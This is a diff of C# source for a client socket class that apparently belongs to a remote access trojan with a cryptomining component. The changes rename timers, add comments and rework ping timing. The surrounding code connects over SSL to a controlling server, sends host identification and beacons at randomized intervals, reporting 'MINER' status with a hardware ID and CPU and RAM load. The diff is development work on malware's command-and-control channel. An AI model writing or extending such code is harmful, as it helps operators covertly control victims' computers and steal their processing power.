@@ -22,17 +22,19 @@ namespace Client.Connection
 {
     public static class ClientSocket
     {
-        public static Socket TcpClient { get; set; }
-        public static SslStream SslClient { get; set; }
-        private static byte[] Buffer { get; set; }
-        private static long Buffersize { get; set; }
-        private static Timer Tick { get; set; }
-        private static MemoryStream MS { get; set; }
-        public static bool IsConnected { get; set; }
-        private static object SendSync { get; } = new object();
-        public static Stopwatch Pong { get; set; }
+        public static Socket TcpClient { get; set; } //Main socket
+        public static SslStream SslClient { get; set; } //Main SSLstream
+        private static byte[] Buffer { get; set; } //Socket buffer
+        private static long Buffersize { get; set; } //Recevied size
+        private static Timer KeepAlive { get; set; } //Send Performance
+        private static MemoryStream MS { get; set; } //Socket MS
+        public static bool IsConnected { get; set; } //Check socket status
+        private static object SendSync { get; } = new object(); //Sync send
+        private static Timer Ping { get; set; } //Send ping interval
+        public static int Interval { get; set; } //ping value
 
-        public static void InitializeClient()
+
+        public static void InitializeClient() //Connect & reconnect
         {
             try
             {
@@ -90,8 +92,7 @@ namespace Client.Connection
                     Buffer = new byte[4];
                     MS = new MemoryStream();
                     Send(IdSender.SendInfo());
-                    Tick = new Timer(new TimerCallback(KeepAlivePacket), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 60 * 1000));
-                    Pong = new Stopwatch();
+                    KeepAlive = new Timer(new TimerCallback(KeepAlivePacket), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 60 * 1000));
                     SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
                 }
                 else
@@ -126,7 +127,7 @@ namespace Client.Connection
 
             try
             {
-                Tick?.Dispose();
+                KeepAlive?.Dispose();
                 SslClient?.Dispose();
                 TcpClient?.Dispose();
                 MS?.Dispose();
@@ -134,7 +135,7 @@ namespace Client.Connection
             catch { }
         }
 
-        public static void ReadServertData(IAsyncResult ar)
+        public static void ReadServertData(IAsyncResult ar) //Socket read/recevie
         {
             try
             {
@@ -243,9 +244,15 @@ namespace Client.Connection
             msgpack.ForcePathObject("Packet").AsString = "Ping";
             msgpack.ForcePathObject("Message").AsString = $"MINER {SetRegistry.GetValue(Settings.Hwid) ?? "0"}   CPU {(int)IdSender.TheCPUCounter.NextValue()}%   RAM {(int)IdSender.TheMemCounter.NextValue()}%";
             Send(msgpack.Encode2Bytes());
-            Pong.Reset();
-            Pong.Start();
+            Ping?.Dispose();
+            Interval = 0;
+            Ping = new Timer(new TimerCallback(Pong), null, 1, 1);
             GC.Collect();
+        }
+
+        private static void Pong(object obj)
+        {
+            Interval++;
         }
     }
 }
